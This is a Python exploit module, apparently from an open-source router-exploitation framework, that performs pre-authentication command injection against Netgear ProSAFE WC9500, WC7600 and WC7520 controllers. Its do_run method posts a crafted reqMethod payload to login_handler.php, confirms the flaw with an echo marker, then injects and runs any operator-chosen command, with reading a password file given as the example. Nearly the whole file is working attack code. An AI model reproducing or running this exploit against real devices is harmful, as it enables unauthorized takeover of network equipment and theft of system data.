# Name: Netgear ProSAFE remote code execution
# File: prosafe_exec.py
# Author: Ján Trenčanský
# License: GNU GPL v3
# Created: 23.07.2016
# Last modified: 23.07.2016
# Shodan Dork:
# Description: Pre-auth command execution in web interface in Netgear ProSAFE WC9500, WC7600, WC7520
# Based on: http://firmware.re/vulns/acsa-2015-002.php

import core.Exploit
import core.io

import requests
import interface.utils
from interface.messages import print_error, print_success, print_help, print_info


class Exploit(core.Exploit.RextExploit):
    """
Name: Netgear ProSAFE remote code execution
File: prosafe_exec.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 23.07.2016
Description: Pre-auth command execution in web interface in Netgear ProSAFE WC9500, WC7600, WC7520
Based on: http://firmware.re/vulns/acsa-2015-002.php

Options:
    Name        Description

    host        Target host address
    port        Target port
    command     Command to execute e.g. cat var/passwd
    """
    command = ""

    def __init__(self):
        self.command = "pwd"
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "command":
                self.command = ' '.join(args[1:])
        except IndexError:
            print_error("please specify value for variable")

    def do_command(self, e):
        print_info(self.command)

    def help_command(self):
        print_help("Prints current value of command")

    def do_run(self, e):
        url = "http://%s:%s/login_handler.php" % (self.host, self.port)
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'Accept-Language: en-us,en;q=0.5',
                   'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'
                   }
        data = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; echo "741852'
        try:
            response = requests.post(url=url, headers=headers, data=data, timeout=60)
            if "741852" in response.text:
                print_success("target is vulnerable")
                # Not so sure about quoting of commands that has arguments
                data = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; %s' % self.command
                response = requests.post(url=url, headers=headers, data=data, timeout=60)
                print(response.text)
            elif "failure" in response.text:
                print_error("Exploit failed, target is probably patched")
                print(response.text)
        except requests.Timeout:
            print_error("exploit failed")
        except requests.ConnectionError:
            print_error("exploit failed")
Exploit()
